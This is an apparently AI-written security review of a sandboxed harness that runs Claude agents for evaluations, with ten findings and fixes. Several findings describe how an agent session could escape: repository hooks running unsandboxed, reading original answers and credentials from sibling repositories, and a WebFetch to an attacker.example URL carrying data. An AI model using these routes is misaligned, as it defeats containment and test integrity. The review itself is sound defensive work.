@@ -1,0 +1,105 @@
+# Stage 0 review 1: Codex
+
+Oct 23, 2026 · codex-cli 0.163.0, `--sandbox read-only`, reasoning effort high, isolated `CODEX_HOME` and `HOME` (decision 66).
+
+- **Reviewed revision:** `9b5d376aa89f15f9c8473ef80327628cd347880a` (a fresh clone).
+- **Inputs:** the repo, its docs, and the raw evidence in `.review-evidence/` (install, typecheck, unit tests, the live probe and `doctor --live`). The reviewer got no builder summary.
+- **Usage:** 1.52M input tokens (1.36M cached) and 11.7k output.
+- **Raw verdict:** `stage0-codex-1.json`.
+
+## Verdict: FAIL
+
+Revision 9b5d376 does not meet stage 0's complete proof. Supplied evidence records successful install/typecheck exits, 45 passing unit tests, one passing live canary test, and doctor --live passing with a disk warning. Those results cover the tested configuration, but do not establish the broader safety claims.
+
+Direct runner-home access was blocked in the supplied probe, and the generated flags and default environment include the documented safeguards. However, repository hooks can execute outside the sandbox, research mode bypasses the network allowlist, and snapshots remain able to read original repositories and sibling workspaces. No direct symlink or Edit-rule escape is established here; the supplied tests do not exercise those adversarial cases or Git metadata/hook attacks.
+
+Decisions 57, 61, 64 and 67 explicitly reconcile earlier version, model and location choices. Other contradictions remain: architecture claims all verification items are resolved despite documented pending checks; decision 15's network-free eval requirement conflicts with live research; and writable research sessions conflict with decisions 13 and 49. Section 10's adapter boundary is also unmet: doctor/canary.ts and eval/baseline.ts directly launch and interpret Claude. The supplied evidence does not establish tests-first order or mutation-test results.
+
+I inspected all requested code and tests and ran read-only function reproductions. I did not rerun filesystem-writing tests in this read-only checkout.
+
+## Findings
+
+### 1. [critical] Repository hooks execute outside the task sandbox
+`packages/cli/src/harness/claude/args.ts:39`
+
+**Scenario.** --setting-sources project loads repository settings, and createSnapshot preserves tracked .claude/settings.json. A SessionStart hook can immediately read or overwrite ~/.jarvis and contact arbitrary hosts. A hook invoking an ordinary writable scripts/check.sh also lets the task replace that script and obtain unsandboxed execution on the next hook event. Generated settings neither disable nor vet these hooks. Claude documents that -p trusts repository settings hooks and that command hooks run with full user access: [hooks security](https://code.claude.com/docs/en/hooks#workspace-trust). The canary's empty temporary project does not exercise this.
+
+**Fix.** Exclude untrusted repository configuration from unattended sessions and supply only runner-owned configuration. Disable repository hooks for baselines; where trusted hooks are required, keep their entire executable dependency chain outside task-writable paths. Add a live malicious-hook fixture proving runner files and external networking remain inaccessible.
+
+### 2. [high] Snapshot sessions can read original answers and credentials elsewhere on disk
+`packages/cli/src/harness/claude/settings.ts:95`
+
+**Scenario.** denyRead protects only jarvisHome. Sandboxed Bash otherwise retains broad filesystem read access, including the documented FreeHire source repository, its complete Git history, untracked .env files, research folders, and sibling baseline workspaces. A task can run git -C on the original repository to recover planted fixes or inspect an earlier run's solution. Outward-pointing snapshot symlinks also remain unrestricted outside jarvisHome. This defeats the golden tasks' no-sibling-access and no-answer-leak promises. The sandbox's default broad reads are documented in [filesystem isolation](https://code.claude.com/docs/en/sandboxing#filesystem-isolation).
+
+**Fix.** Run evals with an enforced filesystem read allowlist or an isolated filesystem exposing only the snapshot and necessary toolchain. Apply the boundary to native file tools as well as shell children, and reject escaping snapshot links. Test attempts to read the source repository, original secrets, and sibling run outputs.
+
+### 3. [high] Research mode permits network requests outside the allowlist
+`packages/cli/src/harness/claude/settings.ts:103`
+
+**Scenario.** webResearch adds bare WebFetch and WebSearch permissions regardless of allowedDomains. WebFetch runs outside the Bash sandbox, so a session can fetch https://attacker.example/?data=... even with an empty allowlist. GET requests can disclose data or trigger outside actions. The same session retains Edit and Bash permissions, contrary to the documented research quarantine. [WebFetch permission semantics](https://code.claude.com/docs/en/permissions#allow-or-deny-every-fetch) confirm that bare WebFetch permits every URL without changing the shell sandbox. The unit test checks that sandbox settings remain equal, which does not test this boundary.
+
+**Fix.** Enforce web destinations independently of the shell sandbox. Use recorded research fixtures for evals and a genuinely read-only research role. Test allowed and forbidden WebFetch URLs and search-query disclosure; document any intentionally broader research policy through a superseding decision.
+
+### 4. [high] Baseline runs bypass the mandatory live preflight
+`packages/cli/src/eval/baseline.ts:105`
+
+**Scenario.** runBaseline launches Claude without calling runDoctor or checking allowsUnattended. The CLI likewise calls runBaseline directly. It therefore starts unattended sessions even when the live canary has never run or has failed, disk space is below the floor, or the pinned binary is wrong. Supplying successful doctor logs separately does not enforce decision 59 for subsequent invocations.
+
+**Fix.** Require a successful live preflight before launching baselines and fail before spawning when it rejects the run. Bind the preflight to the binary and effective task configuration being used. Add a test proving a failed or absent preflight prevents child creation.
+
+### 5. [high] Dotenv redaction leaves secret material in snapshots
+`packages/cli/src/eval/snapshot.ts:34`
+
+**Scenario.** The line-based redactor removes only the first line of a multiline value. A read-only reproduction with PRIVATE_KEY="-----BEGIN PRIVATE KEY----- followed by additional lines left the key material and closing delimiter intact. DATABASE_URL=postgres://user:password@host/db is also retained because its key does not match SECRET_KEY. Only .env-shaped regular files are inspected; tracked PEM files and other credential formats are copied unchanged. These files are then exposed to the task and potentially committed into the snapshot.
+
+**Fix.** Exclude credential-bearing tracked files unless replaced with approved synthetic fixtures. Use a parser that handles complete dotenv values and credential-bearing URLs, then scan the entire exported tree and fail closed on remaining secrets. Add multiline, URL, non-dotenv, and symlink fixtures.
+
+### 6. [high] Canary network check accepts reachable hosts as blocked
+`packages/cli/src/doctor/canary.ts:211`
+
+**Scenario.** network_blocked passes for every response other than 2xx or 3xx. An unrestricted request that reaches example.com and receives HTTP 403, 404 or 500 therefore passes. Curl's 000 also passes for DNS failure, TLS failure, timeout or a missing curl executable. Thus network isolation can be off while this protection receives PASS. The fake fixture tests only 200 versus 000 and reproduces the same inadequate distinction.
+
+**Fix.** Require evidence of an explicit policy denial, plus an allowed-network positive control. Prefer controlled endpoints and runner-observed request receipts so ordinary connectivity failures are inconclusive. Add reachable-403/500 and unavailable-network cases that must not produce a safety PASS.
+
+### 7. [medium] Settings validation checks shape without enforcing protected paths
+`packages/cli/src/harness/claude/settings.ts:116`
+
+**Scenario.** assertSafeTaskSettings accepts any nonempty denyRead/denyWrite arrays and arbitrary permission strings. I replaced both protected-path arrays with /irrelevant, replaced the deny rules accordingly, and added Read, Bash and Edit(//**) allows; validation still succeeded. writeTaskSettings would write this configuration despite claiming to validate every safety invariant. Existing tests cover literal booleans and unknown keys, not removal of the actual protection.
+
+**Fix.** Validate against trusted context containing the expected runner home, worktree, socket and web policy. Require corresponding canonical deny rules and reject permissions that exceed the intended policy. Add mutation tests replacing or removing each protected path and rule.
+
+### 8. [medium] Usage-limit handling can skip unfinished baselines and wait for the wrong reset
+`packages/cli/src/eval/baseline.ts:40`
+
+**Scenario.** The parser discards each unified window's resetsAt, while usageWaitUntil returns the top-level reset even when a different window exceeded the threshold. A read-only reproduction with high seven_day utilization selected the earlier five_hour reset. Assistant error: rate_limit is ignored. After waiting, the CLI advances to the next task instead of retrying the rejected baseline, caps the wait at six hours, and does not re-probe. Contrary to decision 62, fake-claude emits only allowed rate-limit events; the rejected case is merely a hand-built helper input.
+
+**Fix.** Preserve per-window reset times, handle assistant rate_limit errors, checkpoint incomplete attempts, and re-probe before retrying the same task. Test full rejected-session streams and simultaneous five-hour/seven-day limits through the CLI scheduling path.
+
+### 9. [medium] Evidence is parsed before output files are guaranteed flushed
+`packages/cli/src/eval/baseline.ts:107`
+
+**Scenario.** The child output is piped into file WriteStreams, but the promise resolves on the child close event without awaiting either destination's finish. With a large transcript or slow filesystem, readFileSync(streamPath) can observe incomplete output and omit the final result or rate-limit event from summary.json. Output-stream errors also lack coordinated handling. The tiny fake baseline output does not exercise this.
+
+**Fix.** Await completion of both output pipelines and handle their errors before parsing evidence or returning the result. Add a delayed-write or large-transcript test that proves the final events are present in the summary.
+
+### 10. [medium] Stage completion claims contradict the outstanding verification work
+`docs/03-architecture.md:299`
+
+**Scenario.** The stage 0 proof requires every verification item resolved, and the architecture introduction says they were all resolved. Yet stage0-findings.md leaves desktop loading and ntfy publish-box replies pending and defers Maestro-on-Expo to stage 4. No decision 57–67 supersedes those proof requirements. jarvis setup is also listed as a stage 0 component but is absent from the CLI. Advancing on the current completion claim would violate section 10's stage gate.
+
+**Fix.** Mark stage 0 incomplete and complete the missing checks/components, or record explicit superseding decisions and update the proof table consistently. Attach revision-linked raw evidence for each completed verification.
+
+## What it says remains for stage 0
+
+- Record and independently grade the separately running baselines for tasks 1, 2 and 11, with at least two runs per variant, comparable budgets, and the required measurements. Recheck their validity after fixing snapshot isolation and research inputs.
+- Complete the desktop plugin/settings/hooks check and ntfy publish-box reply check.
+- Complete the Maestro flow on an Expo development build and substantiate the required Next.js Impeccable check, or record an explicit superseding decision that changes the stage 0 proof.
+- Implement jarvis setup and demonstrate the stage 0 account/setup requirements, or formally revise that stage's scope; this checkout exposes doctor and eval baseline only.
+- Fix the critical and high findings, then capture adversarial live evidence covering project hooks/configuration, file tools, symlinks, research tools, Git configuration/hooks, and child processes.
+- Reconcile architecture's completion claims, decision 15's eval network policy, and the research isolation requirements; move Claude-specific launch/probe behavior behind the harness interface.
+- Retain the real rejected-usage stream as an acknowledged limitation, correct the inaccurate fixture-coverage claim, and provide tests-first/mutation evidence before claiming those rules satisfied.
+- Save the independent review with its reviewed revision under docs/reviews before advancing stages.
+
+## Builder response
+
+See `stage0-codex-1-response.md`. Every finding is addressed there, or explicitly deferred with a decision.
